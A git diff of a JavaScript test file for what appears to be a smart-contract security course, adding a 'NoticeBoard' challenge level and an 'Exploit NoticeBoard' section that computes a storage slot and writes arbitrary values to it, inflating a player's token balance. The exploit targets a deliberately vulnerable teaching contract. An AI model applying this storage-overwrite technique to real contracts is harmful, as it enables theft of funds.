@@ -1,4 +1,4 @@
-const { expect } = require("chai");
+const { expect, util } = require("chai");
 const { BigNumber, utils } = require("ethers");
 const { deployAllLevels } = require("../src/deployLevels");
 
@@ -24,6 +24,7 @@ describe("CourseContract", () => {
       findMyABI,
       hashCrack,
       heSaysSheSays,
+      noticeBoard,
     ] = await deployAllLevels(courseContract, ethers, false);
 
     // Challenger can attempt level and be awarded tokens
@@ -96,13 +97,43 @@ describe("CourseContract", () => {
     await expect(await courseToken.balanceOf(owner.address)).to.equal(
       BigNumber.from("100000000000000000000")
     );
-    
+
     // Attempt HeSaysSheSays
     await heSaysSheSays.connect(addr1).submit(owner.address);
     await heSaysSheSays.submit(addr1.address);
     await expect(await courseToken.balanceOf(owner.address)).to.equal(
       BigNumber.from("110000000000000000000")
     );
-    
+
+    // Attempt NoticeBoard
+    await noticeBoard.scribble(owner.address, utils.hexZeroPad("0x01", 32));
+    await noticeBoard.submit();
+    await expect(await courseToken.balanceOf(owner.address)).to.equal(
+      BigNumber.from("120000000000000000000")
+    );
+
+    // Exploit NoticeBoard
+    const Storage = await ethers.getContractFactory("Storage");
+    const storage = await Storage.deploy();
+    await storage.deployed();
+    const slotNo = await storage.reverseArrLocation(3, 1, 1);
+    await noticeBoard.scribble(
+      slotNo,
+      utils.hexZeroPad(
+        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+        32
+      )
+    );
+    await noticeBoard.scribble(addr1.address, utils.hexZeroPad("0x01", 32));
+    await noticeBoard.connect(addr1).submit();
+    await noticeBoard.scribble(
+      slotNo,
+      utils.hexZeroPad("0x8ac7230489e80000", 32)
+    );
+    await expect(
+      BigNumber.from("10000000000000000000000000000").lt(
+        await courseToken.balanceOf(addr1.address)
+      )
+    ).to.eq(true);
   });
 });
